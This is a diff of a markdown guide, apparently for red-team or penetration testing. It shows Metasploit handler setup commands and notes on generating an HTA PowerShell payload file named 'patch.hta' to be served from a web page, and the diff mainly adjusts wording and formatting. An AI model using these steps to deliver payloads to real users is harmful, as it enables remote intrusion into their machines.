@@ -44,14 +44,16 @@ msf5 exploit(multi/handler) > set stagerverifysslcert  true
 msf5 exploit(multi/handler) > set HANDLERSSLCERT /location/to/pem.pem
 msf5 exploit(multi/handler) > set exitonsession false
 msf5 exploit(multi/handler) > exploit -j
-
-
 ```
+
 **generate** Note: This could throw an error depending on the version of MSF you are using.
-Older versions of msf use slightly different option flags.  Check the options.
+Older versions of msf use slightly different option flags.  Check the options for your version.
+
 This may work instead: `generate -t hta-psh -f /tmp/patch.hta`
-the `-t` was for output format but in `msf5>` it is `-f`
-the `-f` was for output filename but in `msf5>` it is `-o`
+
+The `-t` was for output format but in `msf5>` it is `-f`
+
+The `-f` was for output filename but in `msf5>` it is `-o`
 
 **Simple HTML page** te server the HTA file just created
 ```html
